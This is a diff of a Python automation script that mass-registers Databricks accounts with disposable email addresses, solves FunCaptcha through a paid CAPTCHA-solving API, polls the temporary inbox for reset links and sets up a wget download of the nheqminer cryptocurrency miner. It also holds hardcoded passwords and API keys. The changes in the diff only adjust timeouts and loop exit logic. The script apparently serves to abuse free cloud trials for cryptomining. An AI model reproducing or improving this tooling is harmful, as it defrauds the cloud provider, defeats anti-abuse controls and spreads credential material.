@@ -30,8 +30,8 @@ scriptmining= "!wget https://github.com/VerusCoin/nheqminer/releases/download/v0
 passwork   ="1234Abcdf@"
 api="Jp6jbfaQ7WYdi54EcN0w"
 urlmail="https://temp-databricks.tk/api/"
-timeopen=30
-timewaiting=30
+timeopen=120
+timewaiting=120
 def bypass_captcha():
    r=requests.post("https://api.anycaptcha.com/createTask",headers = {'Content-Type': 'application/json'},data=json.dumps({"clientKey": "458d1c46ef944b1dba0c8d1ad10f3a0d","task": {"type": "FunCaptchaTaskProxyless","websitePublicKey": "A0DE7B75-1138-44F2-B132-ED188CEB66F3"}}))
    datatext=r.json()
@@ -59,7 +59,8 @@ def getmail(firstname,lastname):
    return email   
 
 def checkmail(email):
-  while True: 
+  n=0
+  while n==0: 
    time.sleep(5)
    req=requests.get(urlmail+"messages/"+email+"/"+api)
    data=req.json()   
@@ -71,7 +72,8 @@ def checkmail(email):
         linkreset=mailbox[mintext+6:maxtext]
         if linkreset !='':
            return linkreset
-      break
+           n=1
+           break
    else: continue
 # Tao acc Databricks
 def regdatabricks(driver,gmail,firstname,lastname,company,title):
